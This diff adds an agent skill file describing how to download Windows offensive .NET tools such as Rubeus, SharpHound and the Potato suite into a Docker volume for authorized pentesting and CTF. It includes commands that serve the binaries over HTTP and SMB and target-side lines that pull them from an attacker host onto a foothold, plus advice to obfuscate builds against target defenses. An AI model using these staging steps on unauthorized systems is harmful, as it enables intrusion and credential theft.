@@ -1,0 +1,81 @@
+---
+name: wintools
+description: Fetch prebuilt Windows offensive tooling (GhostPack/Rubeus, SharpHound, Certify, Seatbelt, Inveigh, the *Potato suite, …) from the Forge registry into a shared, off-host /tools volume, for authorized pentesting and CTF. Use when you need a Windows .NET tool for a target and don't want the binary touching your host (EDR/false-positive safety). Triggers on "grab a windows tool", "download Rubeus/SharpHound/Certify/Seatbelt", "I need <SharpX> for the box", "get a forge package", "windows tooling", "prebuilt offensive .NET binary".
+---
+
+Base directory for this skill: `.claude/skills/wintools`
+
+# wintools — prebuilt Windows tooling into a shared, off-host /tools
+
+Pull prebuilt Windows offensive binaries (Forge / `forgenet.pages.dev`, which
+builds GhostPack, SpecterOps, and the wider SharpCollection ecosystem) straight
+into a **Docker named volume** so they're ready to stage onto a target — **without
+the `.exe` ever landing on your host filesystem**.
+
+## Why this exists (the safety model)
+
+You often need `Rubeus.exe`/`SharpHound.exe`/etc. for a Windows box, but writing
+offensive binaries to your host trips EDR and risks false-positive quarantine. So
+`roo tools` puts them in the **`roorecon-tools` Docker volume**, which:
+
+- **is shared** across every `roo shell` (all mount it at `/tools`),
+- **persists** between shells and engagements (it's a volume, not a `--rm` FS),
+- **never lands on a host path** — it lives inside the Docker VM
+  (`/var/lib/docker/volumes/roorecon-tools/_data`, in the WSL2/Hyper-V VM), and the
+  download + unzip happen *inside* a container, so the bytes never touch a host
+  NTFS path your EDR scans.
+
+Honest scope: this protects *your* host from *your* tooling. It is not isolation
+from the target's defenses — the `.exe` you stage will still face the target's AV/
+EDR (obfuscate/choose builds accordingly). And downloads egress the **public
+internet, never the VPN** (Forge is a public registry, like CVE lookups).
+
+## Commands
+
+```bash
+scripts/roo tools list [filter]     # what Forge offers (filter by substring)
+scripts/roo tools get <name>        # download + unpack latest <name> → /tools/<name>/
+scripts/roo tools installed         # what's in the volume now
+scripts/roo tools rm <name>         # remove /tools/<name> from the volume
+```
+
+`list`/`get` don't need the VPN. Names map to upstream repos — `rubeus`,
+`sharphound`, `certify`, `seatbelt`, `sharpup`, `sharpdpapi`, `inveigh`,
+`sweetpotato`, `godpotato`, `whisker`, `sharpsuccessor`, `snaffler`, … — run
+`roo tools list` for the live set.
+
+## Workflow
+
+1. **Find it.** `scripts/roo tools list rubeus` → confirm the package + version.
+2. **Fetch it.** `scripts/roo tools get rubeus` → unpacks to `/tools/rubeus/`
+   (a bundle may contain several .NET-version builds; pick the one the target's
+   runtime supports). Idempotent — re-`get` to refresh.
+3. **Use it from a `roo shell`.** The volume is mounted at `/tools`, so the binary
+   is right there:
+   ```bash
+   scripts/roo shell ls /tools/rubeus            # (PowerShell host: prefix MSYS_NO_PATHCONV=1
+   scripts/roo shell sh -c 'ls -la /tools'       #  is only needed from Git-Bash, see CLAUDE.md)
+   ```
+4. **Stage it onto the target.** The `.exe` runs on *Windows*, not in the Linux
+   container — the container just **serves** it at the tunnel IP. From a `roo
+   shell` (LHOST = `roo ip`):
+   ```bash
+   # HTTP pickup:
+   scripts/roo shell sh -c 'cd /tools/rubeus && python3 -m http.server 8000'
+   #   on target:  iwr http://<LHOST>:8000/Rubeus.exe -OutFile C:\Windows\Temp\r.exe
+   # or SMB:
+   scripts/roo shell impacket-smbserver -smb2support share /tools
+   #   on target:  copy \\<LHOST>\share\rubeus\Rubeus.exe .
+   ```
+   Then execute on the target through your foothold (the ad skill's shells / exec
+   vectors). Catch any callback in `roo shell` at the tunnel IP.
+
+## Notes
+
+- **Persistence is the point** — the volume survives `roo teardown` and outlives a
+  single box, so your tool cache is reusable. Nuke a single tool with `roo tools
+  rm <name>`, or the whole cache with `docker volume rm roorecon-tools`.
+- **Trust/scope** — these are third-party prebuilt binaries; only stage them onto
+  authorized targets, and prefer pinned/known builds for anything that matters.
+- The **hashcat** skill (host GPU) and this skill are the two "fetch from the
+  public internet" helpers; both deliberately bypass the VPN.
